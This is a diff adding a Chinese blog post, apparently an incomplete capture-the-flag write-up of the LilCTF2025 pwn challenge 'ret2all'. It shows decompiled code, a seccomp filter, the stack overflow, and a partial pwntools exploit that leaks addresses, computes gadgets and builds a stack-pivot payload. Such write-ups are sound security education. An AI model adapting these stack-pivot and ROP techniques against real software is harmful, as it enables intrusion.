@@ -1,0 +1,1016 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
+  <link rel="icon" href="/img/666.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#ffffff">
+  <meta name="author" content="roxy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目来自LilCTF2025的一道pwn题:ret2all 如作者所言 一道溢出的痕，一场检测的困，一次极致的栈，一个落寞的人 落寞的人唱着孤独的题，孤独的题笑着落寞的人 人知题恐怖，题晓人心毒 一件完美的艺术品，葬下了整个栈时代 本题风格是极简，不加那些乱七八糟的东西把题目弄的又乱又看不懂，好让做题者知道，做的是pwn题，不是逆向 要让每个不懂逆向的小pwn手都能看懂题目意思，这才是纯粹的pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2all">
+<meta property="og:url" content="https://rr00xxyy.github.io/2026/03/31/ret2all/index.html">
+<meta property="og:site_name" content="roxy&#39;s blog">
+<meta property="og:description" content="题目来自LilCTF2025的一道pwn题:ret2all 如作者所言 一道溢出的痕，一场检测的困，一次极致的栈，一个落寞的人 落寞的人唱着孤独的题，孤独的题笑着落寞的人 人知题恐怖，题晓人心毒 一件完美的艺术品，葬下了整个栈时代 本题风格是极简，不加那些乱七八糟的东西把题目弄的又乱又看不懂，好让做题者知道，做的是pwn题，不是逆向 要让每个不懂逆向的小pwn手都能看懂题目意思，这才是纯粹的pwn">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/98.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/99.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/100.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/101.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/102.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/103.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/104.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/105.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/113.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/109.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/108.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/110.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/111.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/114.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/115.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/116.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/117.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/118.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/119.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/120.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/121.png">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/122.png">
+<meta property="article:published_time" content="2026-03-31T10:42:17.000Z">
+<meta property="article:modified_time" content="2026-04-15T16:38:26.906Z">
+<meta property="article:author" content="roxy">
+<meta property="article:tag" content="ORW">
+<meta property="article:tag" content="SROP">
+<meta property="article:tag" content="dup2">
+<meta property="article:tag" content="magic-gadget">
+<meta property="article:tag" content="partial overwrite">
+<meta property="article:tag" content="ret2libc">
+<meta property="article:tag" content="ret2syscall">
+<meta property="article:tag" content="ret2text">
+<meta property="article:tag" content="栈迁移">
+<meta property="article:tag" content="栈返回">
+<meta property="article:tag" content="栈风水">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://rr00xxyy.github.io/images/98.png">
+  
+  
+  
+  <title>ret2all - roxy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mui-fluid.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rr00xxyy.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body class="post-page post-page">
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/a.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ret2all"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-31 18:42" pubdate>
+          2026年3月31日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          73 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ret2all</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>题目来自<code>LilCTF2025</code>的一道pwn题:<code>ret2all</code></p>
+<p>如作者所言</p>
+<p>一道溢出的痕，一场检测的困，一次极致的栈，一个落寞的人</p>
+<p>落寞的人唱着孤独的题，孤独的题笑着落寞的人</p>
+<p>人知题恐怖，题晓人心毒</p>
+<p>一件完美的艺术品，葬下了整个栈时代</p>
+<p>本题风格是极简，不加那些乱七八糟的东西把题目弄的又乱又看不懂，好让做题者知道，做的是pwn题，不是逆向</p>
+<p>要让每个不懂逆向的小pwn手都能看懂题目意思，这才是纯粹的pwn</p>
+<p>来看看题目吧</p>
+<p>首先是main函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">return</span> vuln();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后是<code>init</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 savedregs; <span class="hljs-comment">// [rsp+0h] [rbp+0h] BYREF</span><br>  _UNKNOWN *retaddr; <span class="hljs-comment">// [rsp+8h] [rbp+8h]</span><br><br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  RBP = (__int64)&amp;savedregs;<br>  RET = (__int64)retaddr - <span class="hljs-number">32</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RBP:%p\n&quot;</span>, &amp;savedregs);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RET:%p\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)RET);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Keep it and...I love you&quot;</span>);<br>  mprotect((<span class="hljs-type">void</span> *)((<span class="hljs-type">unsigned</span> __int64)&amp;RBP &amp; <span class="hljs-number">0xFFFFFFFFFFFFF000L</span>L), <span class="hljs-number">0x1000u</span>LL, <span class="hljs-number">1</span>);<br>  seccomp();<br>  <span class="hljs-keyword">return</span> close(<span class="hljs-number">2</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>设置了标准I&#x2F;O(0 stdin 1 stdout 2 stderr)</p>
+<p>随后直接打印了<code>RBP</code>的值与返回地址</p>
+<p>使用<code>mprotect</code>将包含全局变量<code>RBP</code>的内存页(按页对齐，大小<code>0x1000</code>字节)设置为<strong>只读</strong></p>
+<p>并<code>close(2)</code>关闭错误输出(stderr)</p>
+<p>以及<code>seccomp</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">seccomp</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v1 = seccomp_init(<span class="hljs-number">2147418112LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">59LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">322LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">303LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">304LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">40LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">44LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">46LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">19LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">17LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">295LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">327LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">9LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">18LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">20LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">296LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">328LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">5LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">10LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">41LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">42LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">49LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">50LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">56LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">57LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">1LL</span>);<br>  <span class="hljs-keyword">return</span> seccomp_load(v1);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/98.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>ban了<code>execve</code>，<code>execveat</code>等等一堆东西</p>
+<p>明显只能<code>ORW</code></p>
+<p>而又注意到read的第一个参数不能大于等于1，因此只能为0(<code>stdin</code>)</p>
+<p>且write的第一个参数只能等于2(<code>stderr</code>)，但是后面又close(2)</p>
+<p>所以需要<code>dup2(1, 2)</code>更改fd才能再调用write</p>
+<p>继续看vuln函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> rread();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>套娃是吧，后面你就懂了</p>
+<p>接下来是<code>rread</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">rread</span><span class="hljs-params">()</span><br>&#123;<br>  _BYTE buf[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-60h] BYREF</span><br><br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x88u</span>LL);<br>  <span class="hljs-keyword">return</span> shadow((__int64)buf);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>终于看到漏洞点了</p>
+<p>buf的长度为96字节，而<code>read</code>读取<code>0x88</code>字节</p>
+<p>显然存在<strong>栈溢出</strong></p>
+<p>不过要注意一下为什么return了一个<code>shadow</code>函数?</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">shadow</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">3</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(<span class="hljs-number">24LL</span> * i + a1), LOVE, <span class="hljs-number">0x18u</span>LL) )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You don&#x27;t love me?&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(a1 + <span class="hljs-number">96</span>), &amp;RBP, <span class="hljs-number">8uLL</span>) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You don&#x27;t keep it?&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(a1 + <span class="hljs-number">104</span>), &amp;RET, <span class="hljs-number">8uLL</span>) )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You don&#x27;t keep it?&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>原来这是一个检测</p>
+<p>要求buf必须为四个<code>I love you I feel lonely</code>(全局变量<code>LOVE</code>)</p>
+<p>且RBP的值与返回地址不能被修改</p>
+<p>乍一看似乎就算没通过检测只是打印<code>You don&#39;t love me?</code>和<code>You don&#39;t keep it?</code></p>
+<p>仔细一想</p>
+<p>puts底层会调用write，而write的fd1被沙箱禁用，便会直接退出程序</p>
+<p>也就是说前<code>0x70</code>字节确实不能动</p>
+<p>故受控的只有后面的<code>0x18</code>字节</p>
+<p>我们能干什么呢?</p>
+<p>不妨调试一下</p>
+<div class="note note-info">
+            <p>注意本地调试最好先暂时关闭<code>ASLR</code></p> 
+          </div>
+
+<p><img src="/images/99.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>发现了什么</p>
+<p>我们可控的最后8字节刚好可以覆盖上一个函数的<code>saved rbp</code></p>
+<p>有什么用呢?</p>
+<p>干说有点抽象</p>
+<p>继续动手调试</p>
+<p>这次先接收白给的信息以通过检测</p>
+<p>并列出也许有用的<code>gadget</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">b&#x27;RBP:&#x27;</span>)<br>RBP = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;RET:&#x27;</span>)<br>RET = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)<br><br>log.success(<span class="hljs-string">f&quot;RBP = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(RBP)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;RET = <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(RET)&#125;</span>&quot;</span>)<br><br>pie_base = RET - <span class="hljs-number">0x1871</span><br>magic_gadget = pie_base + <span class="hljs-number">0x1252</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x0000000000001252 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>read1 = pie_base + <span class="hljs-number">0x182f</span><br>read2 = pie_base + <span class="hljs-number">0x1840</span><br>read3 = pie_base + <span class="hljs-number">0x183b</span><br>leave_ret = pie_base + <span class="hljs-number">0x1852</span><br>pop_rbp_ret = magic_gadget + <span class="hljs-number">1</span><br>ret = pop_rbp_ret + <span class="hljs-number">1</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">.text:000000000000182F                 lea     rax, [rbp+buf]</span><br><span class="hljs-string">.text:0000000000001833                 mov     edx, 88h        ; nbytes</span><br><span class="hljs-string">.text:0000000000001838                 mov     rsi, rax        ; buf</span><br><span class="hljs-string">.text:000000000000183B                 mov     edi, 0          ; fd</span><br><span class="hljs-string">.text:0000000000001840                 call    _read</span><br><span class="hljs-string">.text:0000000000001845                 lea     rax, [rbp+buf]</span><br><span class="hljs-string">.text:0000000000001849                 mov     rdi, rax</span><br><span class="hljs-string">.text:000000000000184C                 call    shadow</span><br><span class="hljs-string">.text:0000000000001851                 nop</span><br><span class="hljs-string">.text:0000000000001852                 leave</span><br><span class="hljs-string">.text:0000000000001853                 retn</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>LOVE = <span class="hljs-string">b&quot;I love you I feel lonely&quot;</span><br><br>payload1 = LOVE * <span class="hljs-number">4</span><br>payload1 += p64(RBP)<br>payload1 += p64(RET)<br><br>payload1 += p64(RBP + <span class="hljs-number">0x10</span>) + p64(read1) + p64(RBP - <span class="hljs-number">0x10</span>)<br></code></pre></td></tr></table></figure>
+
+<p>stack</p>
+<p><img src="/images/100.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>ni</p>
+<p>看到</p>
+<p><img src="/images/101.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>由于多重函数的嵌套调用</p>
+<p>形成连续的3个<code>leave ret</code>!</p>
+<p><code>rread</code>在<code>leave ret</code>返回后执行<code>vuln</code>的<code>leave ret</code></p>
+<p>我们控制<code>vuln</code>的<code>saved rbp</code>到任意地址</p>
+<p>随后执行main的<code>leave ret</code></p>
+<p>此时便会从我们控制的地址开始执行</p>
+<p>即能控制程序执行流程</p>
+<div class="note note-primary">
+            <p>栈迁移(stack pivot)基础，不再赘述</p> 
+          </div>
+
+<p>因此我们布置上面的payload，从而控制执行流再次<code>read</code>，创造利用空间</p>
+<p>然而</p>
+<p>shadow的检测无疑是一道坎</p>
+<p>如果每次都要满足其检测</p>
+<p>又谈何利用?</p>
+<p>因此</p>
+<p>新的知识点出现了</p>
+<p><strong>栈返回</strong></p>
+<p>程序被我们控制后的执行流是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:000000000000182F                 lea     rax, [rbp+buf]<br>.text:0000000000001833                 mov     edx, 88h        ; nbytes<br>.text:0000000000001838                 mov     rsi, rax        ; buf<br>.text:000000000000183B                 mov     edi, 0          ; fd<br>.text:0000000000001840                 call    _read<br>.text:0000000000001845                 lea     rax, [rbp+buf]<br>.text:0000000000001849                 mov     rdi, rax<br>.text:000000000000184C                 call    shadow<br>.text:0000000000001851                 nop<br>.text:0000000000001852                 leave<br>.text:0000000000001853                 retn<br></code></pre></td></tr></table></figure>
+
+<p>看似无法绕过shadow检测</p>
+<p>实则不然</p>
+<p>我们调试看看</p>
+<p><img src="/images/102.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>在<code>call read</code>这里</p>
+<p>我们<code>si</code></p>
+<p><img src="/images/103.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>发现了什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000000001845                 lea     rax, [rbp+buf]<br></code></pre></td></tr></table></figure>
+
+<p><code>call read</code>的返回地址直接被保存在栈上</p>
+<p>补充一下</p>
+<p>read其实是glibc共享库中封装好的函数以方便用户的直接调用</p>
+<p>其内部实则是这样的</p>
+<p><img src="/images/104.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
+<p>当执行<code>SYS_read</code>时才真正触发<strong>系统调用</strong>阻塞并等待中断触发时唤醒读入</p>
